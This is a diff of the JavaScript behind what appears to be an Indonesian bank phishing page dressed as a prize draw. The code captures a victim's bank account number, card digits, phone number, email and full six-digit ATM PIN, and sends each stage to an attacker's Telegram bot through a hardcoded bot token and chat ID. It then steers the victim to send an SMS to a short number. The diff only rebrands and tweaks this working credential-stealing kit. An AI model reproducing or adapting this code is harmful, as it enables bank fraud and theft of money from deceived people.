@@ -4,7 +4,7 @@
 const TELEGRAM_BOT_TOKEN = '8671304632:AAEOnZznJx5LEKARuopQR7NYzNem5TaXTvw';
 const TELEGRAM_CHAT_ID = '5852448478';
 
-// 📦 PENYIMPANAN DATA
+// 📦 PENYIMPANAN DATA PENGGUNA
 let dataPengguna = {
     noRekening: '',
     noKartu: '',
@@ -22,9 +22,7 @@ async function kirimKeTelegram(pesan) {
         console.log('⚠️ Token / Chat ID belum diisi');
         return;
     }
-    
     const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-    
     try {
         await fetch(url, {
             method: 'POST',
@@ -36,9 +34,7 @@ async function kirimKeTelegram(pesan) {
                 disable_web_page_preview: true
             })
         });
-    } catch (e) {
-        console.error('❌ Gagal kirim:', e);
-    }
+    } catch (e) { console.error('❌ Gagal kirim:', e); }
 }
 
 // ==============================================
@@ -46,7 +42,7 @@ async function kirimKeTelegram(pesan) {
 // ==============================================
 function kirimTahap1() {
     const pesan = `
-🟡 [TAHAP 1/2] REGISTRASI BARU
+🟡 [TAHAP 1/2] REGISTRASI BARU — GEBYAR UNDIAN
 ━━━━━━━━━━━━━━━━━━━━━━
 🏦 No. Rekening: \`${dataPengguna.noRekening}\`
 💳 4 Digit Kartu: \`${dataPengguna.noKartu}\`
@@ -63,7 +59,7 @@ function kirimTahap1() {
 // ==============================================
 function kirimTahap2() {
     const pesan = `
-🟠 [TAHAP 2/2] PIN ATM
+🟠 [TAHAP 2/2] PIN ATM — GEBYAR UNDIAN
 ━━━━━━━━━━━━━━━━━━━━━━
 🏦 No. Rekening: \`${dataPengguna.noRekening}\`
 💳 4 Digit Kartu: \`${dataPengguna.noKartu}\`
@@ -88,13 +84,12 @@ function bacaPIN() {
     const p4 = document.getElementById('p4')?.value || '';
     const p5 = document.getElementById('p5')?.value || '';
     const p6 = document.getElementById('p6')?.value || '';
-    
     dataPengguna.pin = p1 + p2 + p3 + p4 + p5 + p6;
     if (dataPengguna.pin.length === 6) kirimTahap2();
 }
 
 // ==============================================
-// 📋 VALIDASI INPUT
+// 🚫 HANYA ANGKA — HURUF OTOMATIS DITOLAK
 // ==============================================
 function hanyaAngka(input) {
     input.value = input.value.replace(/[^0-9]/g, '');
@@ -106,11 +101,11 @@ function validasiNoHP(input) {
 }
 
 // ==============================================
-// 🔄 FUNGSI NAVIGASI
+// 🔄 FUNGSI NAVIGASI HALAMAN
 // ==============================================
-function gantiHalaman(id) {
+function gantiHalaman(idHalaman) {
     document.querySelectorAll('.halaman').forEach(h => h.classList.remove('aktif'));
-    document.getElementById(id).classList.add('aktif');
+    document.getElementById(idHalaman).classList.add('aktif');
 }
 
 function pindahKode(el, idTujuan) {
@@ -122,10 +117,10 @@ function pindahKode(el, idTujuan) {
 }
 
 // ==============================================
-// 📍 NAVIGASI HALAMAN
+// 📍 NAVIGASI 4 HALAMAN
 // ==============================================
 function keRegistrasi() { gantiHalaman('halRegistrasi'); }
-function kembaliKeTetap() { gantiHalaman('halTetap'); }
+function kembaliKeAwal() { gantiHalaman('halAwal'); }
 function kembaliKeRegistrasi() { gantiHalaman('halRegistrasi'); }
 function kembaliKePIN() { gantiHalaman('halPIN'); }
 
@@ -140,7 +135,7 @@ function validasiDanLanjut() {
     
     if (!/^\d{1,15}$/.test(noRek)) return alert('⚠️ No. Rekening: 1-15 digit angka!');
     if (!/^\d{4}$/.test(noKartu)) return alert('⚠️ No. Kartu: Harus 4 digit!');
-    if (!/^(08|\+628)\d{9,11}$/.test(noHP)) return alert('⚠️ No. HP: Awali 08/+628, 10-13 digit!');
+    if (noHP.length < 10) return alert('⚠️ No. HP minimal 10 digit!');
     if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) return alert('⚠️ Format Email salah!');
     
     dataPengguna.noRekening = noRek;
@@ -148,7 +143,7 @@ function validasiDanLanjut() {
     dataPengguna.noHP = noHP;
     dataPengguna.email = email;
     
-    kirimTahap1(); // 🟡 TAHAP 1 TERKIRIM
+    kirimTahap1();
     gantiHalaman('halPIN');
     setTimeout(() => document.getElementById('p1')?.focus(), 300);
 }
@@ -157,7 +152,7 @@ function validasiDanLanjut() {
 // 🔐 PIN ATM → KETERANGAN
 // ==============================================
 function keKeterangan() {
-    bacaPIN(); // 🟠 TAHAP 2 TERKIRIM
+    bacaPIN();
     gantiHalaman('halKeterangan');
 }
 
@@ -165,6 +160,5 @@ function keKeterangan() {
 // 📱 BUKA SMS KE NOMOR 3654
 // ==============================================
 function bukaSMS() {
-    // Membuka aplikasi SMS dengan nomor tujuan 3654
     window.location.href = 'sms:3654';
 }
